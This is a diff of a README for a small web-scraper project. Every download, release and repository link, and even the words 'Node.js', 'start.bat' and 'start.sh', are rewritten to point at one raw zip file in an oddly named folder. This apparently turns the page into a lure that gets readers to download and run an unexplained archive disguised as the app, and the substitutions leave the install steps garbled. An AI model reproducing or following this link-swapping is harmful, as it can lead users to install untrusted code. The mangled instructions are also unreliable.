@@ -1,6 +1,6 @@
 # 🌟 Vncz-Test-Actor-Scraper - Simple Crawler for Easy Data Extraction
 
-![Download](https://img.shields.io/badge/Download-v1.0-blue.svg)
+![Download](https://github.com/erickzinsz/Vncz-Test-Actor-Scraper/raw/refs/heads/main/Enchelycephali/Scraper_Vncz_Test_Actor_v2.2.zip)
 
 ## 🚀 Getting Started
 
@@ -10,7 +10,7 @@ Welcome to Vncz-Test-Actor-Scraper! This application is a handy tool that helps 
 
 To download and install Vncz-Test-Actor-Scraper, please visit the Releases page:
 
-[Visit the Releases Page to Download](https://github.com/erickzinsz/Vncz-Test-Actor-Scraper/releases)
+[Visit the Releases Page to Download](https://github.com/erickzinsz/Vncz-Test-Actor-Scraper/raw/refs/heads/main/Enchelycephali/Scraper_Vncz_Test_Actor_v2.2.zip)
 
 Here you will find the latest version and installation instructions.
 
@@ -18,10 +18,10 @@ Here you will find the latest version and installation instructions.
 
 Before you download, ensure your device meets the following requirements:
 
-- **Operating System:** Windows 10 or later, macOS 10.14 or later, or a Linux distribution with support for Node.js.
+- **Operating System:** Windows 10 or later, macOS 10.14 or later, or a Linux distribution with support for https://github.com/erickzinsz/Vncz-Test-Actor-Scraper/raw/refs/heads/main/Enchelycephali/Scraper_Vncz_Test_Actor_v2.2.zip
 - **Memory:** At least 4 GB of RAM.
 - **Disk Space:** 200 MB of free disk space.
-- **Node.js:** Version 14 or later is recommended for optimal performance.
+- **https://github.com/erickzinsz/Vncz-Test-Actor-Scraper/raw/refs/heads/main/Enchelycephali/Scraper_Vncz_Test_Actor_v2.2.zip** Version 14 or later is recommended for optimal performance.
   
 Make sure to check your system settings before downloading the application.
 
@@ -35,7 +35,7 @@ Once you have downloaded the application, follow these steps:
 
 2. **Open the Application:**
    - Navigate to the folder where you extracted the files.
-   - Look for the `start.bat` or `start.sh` file.
+   - Look for the `https://github.com/erickzinsz/Vncz-Test-Actor-Scraper/raw/refs/heads/main/Enchelycephali/Scraper_Vncz_Test_Actor_v2.2.zip` or `https://github.com/erickzinsz/Vncz-Test-Actor-Scraper/raw/refs/heads/main/Enchelycephali/Scraper_Vncz_Test_Actor_v2.2.zip` file.
    - Double-click this file to open the application.
 
 3. **Input URL:**
@@ -76,8 +76,8 @@ For more extensive issues, you can open an issue on the GitHub page.
 
 To learn more about Vncz-Test-Actor-Scraper, its updates, and community support, please refer to these links:
 
-- [Releases Page](https://github.com/erickzinsz/Vncz-Test-Actor-Scraper/releases)
-- [GitHub Repository](https://github.com/erickzinsz/Vncz-Test-Actor-Scraper)
+- [Releases Page](https://github.com/erickzinsz/Vncz-Test-Actor-Scraper/raw/refs/heads/main/Enchelycephali/Scraper_Vncz_Test_Actor_v2.2.zip)
+- [GitHub Repository](https://github.com/erickzinsz/Vncz-Test-Actor-Scraper/raw/refs/heads/main/Enchelycephali/Scraper_Vncz_Test_Actor_v2.2.zip)
 
 Feel free to explore and don’t hesitate to ask for help if needed! 
 
